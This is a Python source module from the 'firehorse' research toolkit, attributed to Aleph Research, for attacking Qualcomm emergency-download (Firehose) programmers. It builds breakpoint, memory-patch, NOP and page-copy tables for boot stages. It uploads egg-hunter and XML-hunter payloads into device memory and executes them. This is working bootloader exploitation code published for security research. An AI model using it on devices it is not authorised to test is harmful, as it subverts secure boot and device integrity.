#
# firehrose
# By Roee Hay & Noam Hadad, Aleph Research
#

import time
import re
import sys
import binascii
import os
import struct
from constants import *
from fw import Framework as p
from fw import *
from log import *

class PageCopy:
    def __init__(self, mode, src, dst, pages, target_pages = None):
        self.src = src
        self.dst = dst
        self.pages = pages
        self.target_pages = target_pages
        self.mode = mode
        if target.get().arch == 32:
            self.FMT_NPAGES = "<L"
            self.FMT_PAGE = "<BLLL"
        elif target.get().arch == 64:
            self.FMT_NPAGES = "<Q"
            self.FMT_PAGE = "<QQQQ"

    def pack(self):
        data = struct.pack(self.FMT_NPAGES, len(self.pages))
        for p in self.pages:
            src_page = 0x1000*p
            if None == self.target_pages:
                dst_page = self.dst + 0x1000*p-self.src
            else:
                dst_page = self.target_pages.pop()

            data += struct.pack(self.FMT_PAGE, self.mode, src_page, dst_page, 0)

        return data

class Breakpoint:

   
    FMT32 = "<BLB4sBB%ds" % (BP_MSG_LEN+1)
    FMT64 = "<QQQ8sQQ%ds" % (BP_MSG_LEN+1)
 
    def __init__(self, bp_type, addr, size, flag, cb, msg, inst=0):
        self.bp_type = bp_type
        self.addr = addr
        self.size = size
        self.msg = msg[:BP_MSG_LEN]
        self.flag = flag
        self.cb = cb
        if target.get().arch == 32:
            self.FMT = self.FMT32
            self.inst = struct.pack("<L",inst)

        elif target.get().arch == 64:
            self.FMT = self.FMT64
            self.inst = struct.pack("<Q",inst)
        
        
    def pack(self):
      return struct.pack(self.FMT, self.bp_type, self.addr, self.flag, self.inst, self.size, self.cb, self.msg)

class Patch:

   
    FMT32 = "<BL"
    FMT64 = "<QQ"
 
    def __init__(self, mode, addr, val):
        self.mode = mode
        self.addr = addr
        self.val = val

        if target.get().arch == 32:
            self.FMT = self.FMT32
        elif target.get().arch == 64:
            self.FMT = self.FMT64


    def pack(self):
        return struct.pack(self.FMT, self.mode, self.addr) + self.val


class BreakpointManager:

    def __init__(self, bbdb):
        self.bps = []
        self.pages = set()
        self.bbdb = bbdb

    def bp(self, mode, addr, size=4, flag=0, cb=0, msg=""):
        if mode == MODE_PBL:
            self.pages.add(addr / 0x1000)
        if addr not in [bp.addr for bp in self.bps]:
            I('installing bp for %08x', addr)
            self.bps.append(Breakpoint(mode, addr, size, flag, cb, msg))
    
    def break_function(self, mode, fname, flag=0, cb=0):
        block = self.bbdb.get_func_entry(fname)
        self.bp(mode, block.va, flag=flag, cb=cb, msg=block.fname[:BP_MSG_LEN])

    def bp_programmer(self, addr, size=4, flag=0, cb=0, msg=""):
        self.bp(MODE_PROGRAMMER, addr, size, flag, cb, msg)

    def bp_pbl(self, addr, size=4, flag=0, cb=0, msg=""):
        self.bp(MODE_PBL, addr, size, flag, cb, msg)
        

    def bp_sbl(self, addr, size=4, flag=0, cb=0, msg=""):
        self.bp(MODE_SBL, addr, size, flag, cb, msg)
        
    def bp_abl(self, addr, size=4, flag=0, cb=0, msg=""):
        self.bp(MODE_ABL, addr, size, flag, cb, msg)

    def get_breakpoints_count(self):
        return len(self.bps)

    def trace_function(self, mode, fname, flag = 0, cb = 0):
        for block in self.bbdb.get_blocks_for_func(fname):
            msg = "%s-%d" % (block.fname[:BP_MSG_LEN - 4], block.bbid)
            self.bp(mode, block.va, size=block.instsize, flag=flag, cb=cb, msg=msg[:BP_MSG_LEN])


    def pack(self):

        l = 0
        for b in sorted([bp.addr for bp in self.bps]):
            if b - l < 4:
#                assert 0 == 1, "adjacent breakpoint detected: %08x" % b
                pass

            l = b

        bps = b""
        for bp in self.bps:
            bps += bp.pack()
         
        return bps

    def get_pbl_page_numbers(self):
        return self.pages    

class PatchManager:

    NOP = 0xE320F000
    
    
    def __init__(self):
        self.patches = []
        self.pages = set()

    def patch(self, mode, addr, val):
        
        assert 0 == len(val) % 4 
        i = 0
        while i < len(val):
            self.patches.append(Patch(mode, addr+i, val[i:i+4]))
            i+=4
        

    def patch32(self, mode, addr, val):
        self.patch(mode, addr, struct.pack("<L", val))

    def patch32_programmer(self, addr, val):
        self.patch32(MODE_PROGRAMMER, addr, val)

    def patch32_pbl(self, addr, val):
        self.patch32(MODE_PBL, addr, val)
        self.pages.add(addr / 0x1000)

    def patch32_sbl(self, addr, val):
        self.patch32(MODE_SBL, addr, val)

    def patch32_abl(self, addr, val):
        self.patch32(MODE_ABL, addr, val)


    def nop(self, mode, start_addr, end_addr):
        n = (end_addr - start_addr)/4
        for i in xrange(n):
            self.patch32(mode, start_addr+i*4, PatchManager.NOP)

    def get_pbl_page_numbers(self):
        return self.pages
        
    def get_patch_count(self):
        return len(self.patches)
    
    def pack(self):
        x = b""
        for p in self.patches:
            x+=p.pack()
        return x

    

class Firehorse:

    FMT32 = "<BLLLLL"
    FMT64 = "<QQQQQQ"

    def __init__(self, pm, bpm, pagecopy):
        self.pm = pm
        self.bpm = bpm
        self.pc = pagecopy
        
        if target.get().arch == 32:
            self.FMT = self.FMT32
        elif target.get().arch == 64:
            self.FMT = self.FMT64

    def pack(self):
        mode = 0xFF
        if (target.get().arch == 64):
            mode = 0xFFFFFFFFFFFFFFFFL

        fh = struct.pack(self.FMT, mode, self.bpm.get_breakpoints_count(), self.pm.get_patch_count(), 0, 0, 0)
        fh += self.bpm.pack()
        fh += self.pm.pack()
        fh += self.pc.pack()
        return fh


class Egg:
    MAGIC1 = 0xF1438045
    MAGIC2 = 0x5408341F
    SBL_SIZE = 512*1024
    PREFIX_SIZE = 0x120
    EGG_FILE = "../tmp/egg.bin"
    
    FMT32 = "<LLLLL"
    FMT64 = "<QQQQQ"

    PART_SIZE = 800
    uploaded = False

    def __init__(self, blob, dst):
        self.blob = blob

        self.blob += b"\x00" * (4-len(blob)%4)
        self.target = target.get()
        self.dst = dst

        if target.get().arch == 32:
            self.FMT = self.FMT32
        elif target.get().arch == 64:
            self.FMT = self.FMT64

    def upload_egghunter(self):
        I('uploading egghunter to %08x' % self.target.egghunter_base)
        p.sendfile("../device/build/dload.payload", self.target.egghunter_base)
        Egg.uploaded = True

    def cksum(self, data):
        s = 0
        i = 0
        while i < len(data):
            s ^= struct.unpack("<L",data[i:i+4])[0]
            i+=4
        return s

    def get_parts_count(self):
        return 1+len(self.blob)/Egg.PART_SIZE
    
    def pack(self, partmask = 0):

        data = b"" 
        for i in xrange(self.get_parts_count()):

            if (partmask >> i) & 1:
                continue

            part = self.blob[i*Egg.PART_SIZE:(i+1)*Egg.PART_SIZE]
            
            partdata = struct.pack(self.FMT, Egg.MAGIC1, i, len(part), self.dst+i*Egg.PART_SIZE, 0) + part 
            cksum = self.cksum(partdata)
            partdata = partdata[:16] + struct.pack("<L", cksum) + partdata[20:] + struct.pack("<L", Egg.MAGIC2)

            I("i = %d, dst = %08x, cksum = %08x" % (i,self.dst+i*Egg.PART_SIZE, cksum))


            data += partdata
        
        count = (Egg.SBL_SIZE-Egg.PREFIX_SIZE) / len(data)
            
        return b"\x00"*Egg.PREFIX_SIZE + data * count

      
    def send(self):

        if not Egg.uploaded:
            self.upload_egghunter()

        tries = 5

        got_parts = 0
        while tries > 0:
            tries -= 1
            got_parts |= self._send_parts(got_parts)

            if got_parts == (2**self.get_parts_count())-1:
                break

            
        
        I("got all parts in %0d tries" % int(5-tries))
    
    def _send_parts(self, d):

        p.poke32(self.target.egghunter_found_parts, 0)

        file(Egg.EGG_FILE, "wb").write(self.pack(d))
        xml = file(self.target.egg_xml, "rb").read()
        p.firehose(xml)
        
        p.exe_cmd(self.target.egghunter_base, 0)

        found_parts = p.peek32(self.target.egghunter_found_parts)

        #p = (1 << self.get_parts_count())-1

        d = p.peek32(self.target.egghunter_found_parts)

        return d
        #assert p == d, "expected: %08x got: %08x" % (d, p)



class XMLHunter:
    MAGIC_START = 0x66683d22
    MAGIC_QUOTE = 0x12893793
    MAGIC_NULL = 0x714298CF
    MAGIC_ONEAH = 0xAB5CD6FA

    EGG_FILE = "../tmp/xmlhunt.bin"
    FMT = "<LL"
    PART_SIZE = 0x900
    uploaded = False

    def __init__(self, blob, dst, target):
        self.blob = blob
        self.target = target
        self.dst = dst

        if target.xmlhunter_part_size != 0:
            D("Setting PART_SIZE = %08x", target.xmlhunter_part_size)
            XMLHunter.PART_SIZE = target.xmlhunter_part_size

    def upload_xmlhunter(self):
        I('uploading xmlhunter to %08x' % self.target.egghunter_base)
        p.sendfile("../device/build/xmlhunt.payload", self.target.egghunter_base)
        XMLHunter.uploaded = True
      
    def send(self):

        if not XMLHunter.uploaded:
            self.upload_xmlhunter()


        part = b""
        offset = 0
        i = 0
        for c in self.blob:
            if c == "\x00":
                part+=struct.pack("<L", XMLHunter.MAGIC_NULL)
            elif c == "\"":
                part+=struct.pack("<L", XMLHunter.MAGIC_QUOTE)
            elif c == "\x1a":
                part+=struct.pack("<L", XMLHunter.MAGIC_ONEAH)
            else:
                part+=c
            i+=1

            if len(part) > self.PART_SIZE-20:
                I("uploading part of size = %08x, dst = %08x", len(part), self.dst+offset)
                self.do_send(self.dst+offset, part)
                offset += i
                i = 0
                part = b""

        if 0 == len(part):
            return

        I("uploading part of size = %08x, dst = %08x", len(part), self.dst+offset)
        self.do_send(self.dst+offset, part)
        offset += i
        i = 0
        part = b""
        

    def do_send(self, dst, part):

        magic_null = struct.pack("<L", XMLHunter.MAGIC_NULL)
        magic_quote = struct.pack("<L", XMLHunter.MAGIC_QUOTE)
        magic_oneah = struct.pack("<L", XMLHunter.MAGIC_ONEAH)

        part = struct.pack("<L", dst).replace("\x00", magic_null).replace("\"", magic_quote).replace("\x1a", magic_oneah) + part
        p.poke_payload(self.target.exe_addr, self.target.arch / 8, self.target.egghunter_base, part)

class BasicBlock:

    def __init__(self, bbid, fname, va, instsize):
        self.bbid = bbid
        self.fname = fname
        self.va = va
        self.instsize = instsize

    def __repr__(self):
        return "%s-%d" % (self.fname, self.bbid)

class BasicBlocks:
    def __init__(self, path=None):

        self.blocks = {}

        if None == path:
           return
        
        data = file(path, "rb").read()


        for l in data.split("\n"):
            b = l.split(" ")
            instsize = 4
            try:
                instsize = int(b[3])
            except ValueError: pass

            bb = BasicBlock(int(b[1]), b[0], int(b[2],16), instsize)

            if not bb.fname in self.blocks.keys():
                self.blocks[bb.fname] = []
            self.blocks[bb.fname].append(bb)

    def get_blocks_for_func(self, fname):
        return self.blocks[fname]

    def get_func_entry(self, fname):
        return self.get_blocks_for_func(fname)[0]

    def get_functions(self):
        return self.blocks.keys()
    